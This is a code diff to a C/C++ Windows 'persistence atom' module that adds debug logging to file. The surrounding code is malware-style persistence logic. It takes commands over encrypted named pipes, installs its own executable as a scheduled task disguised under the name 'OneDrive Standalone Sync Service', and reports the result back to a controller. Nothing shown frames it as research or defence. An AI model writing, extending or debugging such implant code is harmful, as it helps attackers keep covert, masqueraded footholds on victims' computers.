@@ -12,6 +12,16 @@
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
 
+static void PersistDebug(const char *format, ...) {
+    char buf[512];
+    va_list args;
+    va_start(args, format);
+    vsnprintf(buf, sizeof(buf), format, args);
+    va_end(args);
+    FILE *f = fopen("log\\persist_debug.txt", "a");
+    if (f) { fprintf(f, "[%lu] %s\n", GetTickCount(), buf); fclose(f); }
+}
+
 HRESULT CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath) {
   HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
   if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
@@ -125,18 +135,24 @@ HRESULT CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath)
 
 DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
   DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
+  PersistDebug("[Init] Persistence Atom %lu starting.", dwAtomId);
 
   // 1. Connect to command pipe (receive commands)
   HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
-  if (!hCmdPipe)
+  if (!hCmdPipe) {
+    PersistDebug("[Fatal] IPC_ConnectToCommandPipe FAILED. Error: %lu", GetLastError());
     return 1;
+  }
+  PersistDebug("[Init] Command pipe connected.");
 
   // 2. Connect to report pipe (send reports)
   HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
   if (!hReportPipe) {
+    PersistDebug("[Fatal] IPC_ConnectToReportPipe FAILED. Error: %lu", GetLastError());
     CloseHandle(hCmdPipe);
     return 1;
   }
+  PersistDebug("[Init] Report pipe connected.");
 
   BYTE SharedSessionKey[16];
   memcpy(SharedSessionKey, Config::PSK_ID, 16);
@@ -155,11 +171,14 @@ DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
       IPC_MESSAGE inMsg = {0};
       if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
         if (inMsg.CommandId == CMD_EXECUTE) {
+          PersistDebug("[Exec] Received CMD_EXECUTE.");
           WCHAR szMyPath[MAX_PATH] = {0};
           GetModuleFileNameW(NULL, szMyPath, MAX_PATH);
+          PersistDebug("[Exec] Installing persistence for: %ls", szMyPath);
 
           HRESULT hrResult = CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath);
           if (SUCCEEDED(hrResult)) {
+            PersistDebug("[Exec] CreateScheduledTaskCOM SUCCESS.");
             char report[] = "[PERSIST] Scheduled Task COM Installation SUCCESS.";
             IPC_MESSAGE outMsg = {0};
             outMsg.dwSignature = 0x534D4952;
@@ -169,6 +188,7 @@ DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
             memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
             IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
           } else {
+            PersistDebug("[Exec] CreateScheduledTaskCOM FAILED. HR: 0x%08X", hrResult);
             char report[256];
             sprintf_s(report, "[PERSIST] Scheduled Task COM Installation FAILED. HR: 0x%08X", hrResult);
             IPC_MESSAGE outMsg = {0};
